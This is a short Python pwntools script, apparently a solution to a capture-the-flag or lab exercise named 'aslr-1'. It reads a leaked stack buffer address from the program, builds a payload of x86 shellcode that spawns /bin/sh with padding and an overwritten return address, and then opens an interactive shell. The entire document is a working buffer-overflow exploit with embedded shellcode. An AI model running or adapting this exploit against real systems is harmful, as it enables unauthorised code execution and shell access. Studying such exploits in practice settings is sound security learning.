#!/usr/bin/env python

from pwn import *

p = process('./aslr-1')

bufAddr = p.recv()
a, b, c, d, bufAddr, e, f, g, h = bufAddr.split(' ')

bufAddr, a = bufAddr.split('\n')
bufAddr = int(bufAddr, 0)

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc9\x89\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'
buf = shellcode + "A" * (0x8c - len(shellcode)) + p32(bufAddr)

p.sendline(buf)

print(p.recv())

p.interactive()
